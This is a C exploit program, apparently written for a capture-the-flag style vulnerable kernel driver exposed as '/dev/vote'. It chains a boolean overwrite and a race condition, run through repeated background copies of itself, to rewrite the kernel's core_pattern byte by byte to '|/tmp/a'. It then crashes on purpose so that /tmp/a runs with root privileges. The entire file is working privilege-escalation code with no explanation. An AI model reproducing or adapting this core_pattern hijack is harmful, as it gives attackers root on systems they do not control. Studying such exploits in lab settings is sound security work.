#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>



int main(int argc, char** argv) {
    //char* goal = "|/tmp/a";
    char* goal = "\0//ampt|";
    int offsets[] = {0,1,5,6,3,4,2,0};
    char buff[1000];
    unsigned int buf[100] = {0};
    int i,j;


    if (argc>1) {
        buf[0] = 2;
        buf[1] = 0x6F776E;
        buf[2] = 260+atoi(argv[1]);
        buf[3] = strtoul(argv[2],NULL,16);
        buf[4] = 0;
        buf[5] = 256*150;
        buf[6] = 256*150*150*strtoul(argv[3],NULL,16);
        int fd = open("/dev/vote", 1);
        write(fd, buf, sizeof(unsigned int)*7);
        close(fd);
        exit(0);
    }

    puts("Triggering bool overwrite");
    puts("Press enter to continue...");
    getchar();

    // Force it to set oldptr to something
    buf[0] = 2;
    buf[1] = 0x6F776E;
    buf[2] = 256;
    buf[3] = 0x41;
    buf[4] = 0;
    buf[5] = 0;
    buf[6] = 0;
    int fd = open("/dev/vote", 1);
    write(fd, buf, sizeof(unsigned int)+240);
    close(fd);

    buf[0] = 2;
    buf[1] = 0x6F776E;
    buf[2] = 256+4;
    buf[3] = 0x98;
    buf[4] = 0;
    buf[5] = 0;
    buf[6] = 0;
    fd = open("/dev/vote", 1);
    write(fd, buf, sizeof(unsigned int)*7);
    close(fd);
    
    buf[0] = 2;
    buf[1] = 0x6F776E;
    buf[2] = 0;
    buf[3] = 0;
    buf[4] = 0;
    buf[5] = 0;
    buf[6] = 0;
    fd = open("/dev/vote", 1);
    write(fd, buf, sizeof(unsigned int)*7);
    close(fd);

    puts("Starting race condition");
    puts("Press enter to continue...");
    getchar();

    for (i=1; i<8; i++) {
        int j;
        for (j=goal[i-1]; j<goal[i]; j++) {
            buf[0] = 1;
            buf[1] = 1;
            fd = open("/dev/vote", 1);
            write(fd, buf, sizeof(unsigned int)*7);
            close(fd);
        }

        printf("Writing %c\n Press enter to continue...",goal[i]);
        puts("Press enter to continue...");
        getchar();



        long addr = 0xc13f3520;

        sprintf(buff, "./exploit 0 %x %x &", ((addr)&0xff)+offsets[i], goal[i]);
        system(buff);
        sprintf(buff, "./exploit 1 %x %x &", (addr>>8)&0xff, goal[i]);
        system(buff);
        sprintf(buff, "./exploit 2 %x %x &", (addr>>16)&0xff, goal[i]);
        system(buff);
        sprintf(buff, "./exploit 3 %x %x &", (addr>>24)&0xff, goal[i]);
        system(buff);

        sleep(1);

        buf[0] = 2;
        buf[1] = 0x6F776E;
        buf[2] = 1;
        buf[3] = goal[i];
        buf[4] = 0;
        buf[5] = 256*256;
        buf[6] = 256*256*256*goal[i];
        fd = open("/dev/vote", 1);
        write(fd, buf, sizeof(unsigned int)*7);
        close(fd);

        sleep(1);

        puts("Done with racecondition");
        puts("Press enter to continue...");
        getchar();

        getchar();

        buf[0] = 2;
        buf[1] = 0x6F776E;
        buf[2] = 0;
        buf[3] = 0;
        buf[4] = 0;
        buf[5] = 0;
        buf[6] = 0;
        fd = open("/dev/vote", 1);
        write(fd, buf, sizeof(unsigned int)*7);
        close(fd);

        system("cat /proc/sys/kernel/core_pattern");
        puts("^ Core progress...");
        puts("Press enter to continue...");
        getchar();
    }

    puts("About to segfault...");
    puts("Press enter to continue...");
    getchar();

    int * p = NULL;
    *p = 1;

}
